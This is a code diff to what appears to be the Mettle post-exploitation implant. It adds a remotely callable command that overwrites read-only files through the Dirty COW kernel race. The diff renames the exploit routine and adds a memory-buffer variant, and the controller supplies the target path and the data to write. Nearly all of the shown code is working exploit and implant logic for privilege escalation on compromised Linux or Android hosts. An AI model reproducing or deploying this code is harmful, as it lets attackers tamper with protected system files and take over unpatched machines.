@@ -170,7 +170,7 @@ static void *procselfmemThread(void *arg)
 	struct mem_arg *mem_arg;
 	int fd, i, c = 0;
 	mem_arg = (struct mem_arg *)arg;
-	unsigned char *p = mem_arg->patch;
+	const char *p = mem_arg->patch;
 	off_t offset = (off_t)(mem_arg->offset - (void*)0);
 
 	fd = open("/proc/self/mem", O_RDWR);
@@ -192,7 +192,7 @@ static void *procselfmemThread(void *arg)
 	return 0;
 }
 
-static void exploit(struct mem_arg *mem_arg)
+static void start_dcow(struct mem_arg *mem_arg)
 {
 	pthread_t pth1, pth2, pth3;
 
@@ -211,6 +211,55 @@ static void exploit(struct mem_arg *mem_arg)
 	/*LOGV("[*] exploited %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);*/
 }
 
+int rundcow_memory(const char * file, char * memory, size_t size)
+{
+	struct mem_arg mem_arg;
+	struct stat st;
+	struct stat st2;
+
+	int f=open(file,O_RDONLY);
+	if (f == -1) {
+		/*LOGV("could not open %s", tofile);*/
+		return -1;
+	}
+	if (fstat(f,&st) == -1) {
+		/*LOGV("could not open %s", tofile);*/
+		close(f);
+		return 1;
+	}
+
+	if (size != st.st_size) {
+		/*LOGV("warning: new file size (%zd) and file old size (%zd) differ\n", st.st_size, st2.st_size);*/
+		if (st.st_size < size) {
+			close(f);
+			return 4;
+		}
+	}
+
+	mem_arg.patch = memory;
+	mem_arg.patch_size = size;
+	mem_arg.fname = file;
+
+	void * map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, f, 0);
+	if (map == MAP_FAILED) {
+		/*LOGV("mmap");*/
+		free(mem_arg.patch);
+		close(f);
+		return 7;
+	}
+
+	/*LOGV("[*] mmap %p", map);*/
+
+	mem_arg.offset = map;
+
+	start_dcow(&mem_arg);
+	close(f);
+	// to put back
+	/*exploit(&mem_arg, 0);*/
+
+	return mem_arg.success;
+}
+
 int rundcow(const char * fromfile, const char * tofile)
 {
 	/*char * fromfile = argv[1];*/
@@ -222,7 +271,7 @@ int rundcow(const char * fromfile, const char * tofile)
 	int f=open(tofile,O_RDONLY);
 	if (f == -1) {
 		/*LOGV("could not open %s", tofile);*/
-		return 0;
+		return -1;
 	}
 	if (fstat(f,&st) == -1) {
 		/*LOGV("could not open %s", tofile);*/
@@ -289,7 +338,7 @@ int rundcow(const char * fromfile, const char * tofile)
 
 	mem_arg.offset = map;
 
-	exploit(&mem_arg);
+	start_dcow(&mem_arg);
 	free(mem_arg.patch);
 	close(f);
 	// to put back
@@ -298,11 +347,29 @@ int rundcow(const char * fromfile, const char * tofile)
 	return mem_arg.success;
 }
 
+struct tlv_packet *sys_config_dcow_memory(struct tlv_handler_ctx *ctx)
+{
+	const char *target_path = tlv_packet_get_str(ctx->req, TLV_TYPE_TARGET_PATH);
+	size_t buf_len = 0;
+	char *buf = tlv_packet_get_raw(ctx->req, TLV_TYPE_DATA, &buf_len);
+	if (buf == NULL) {
+		return tlv_packet_response_result(ctx, TLV_RESULT_FAILURE);
+	}
+	int ret = rundcow_memory(target_path, buf, buf_len);
+	char * result = 0;
+	int vasresult = asprintf(&result, "mcow (%d)", ret);
+	if (vasresult == -1) {
+		return tlv_packet_response_result(ctx, TLV_RESULT_FAILURE);
+	}
+	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
+	return tlv_packet_add_str(p, TLV_TYPE_LOCAL_DATETIME, result);
+}
+	
 struct tlv_packet *sys_config_dcow(struct tlv_handler_ctx *ctx)
 {
-	const char *lib_path = tlv_packet_get_str(ctx->req, TLV_TYPE_LIBRARY_PATH);
+	const char *file_path = tlv_packet_get_str(ctx->req, TLV_TYPE_FILE_PATH);
 	const char *target_path = tlv_packet_get_str(ctx->req, TLV_TYPE_TARGET_PATH);
-	int ret = rundcow(lib_path, target_path);
+	int ret = rundcow(file_path, target_path);
 	char * result = 0;
 	int vasresult = asprintf(&result, "ncow (%d)", ret);
 	if (vasresult == -1) {
@@ -332,4 +399,5 @@ void sys_config_register_handlers(struct mettle *m)
 	tlv_dispatcher_add_handler(td, "stdapi_sys_config_sysinfo", sys_config_sysinfo, m);
 	tlv_dispatcher_add_handler(td, "stdapi_sys_config_localtime", sys_config_localtime, m);
 	tlv_dispatcher_add_handler(td, "stdapi_sys_config_dcow", sys_config_dcow, m);
+	tlv_dispatcher_add_handler(td, "stdapi_sys_config_dcow_memory", sys_config_dcow_memory, m);
 }
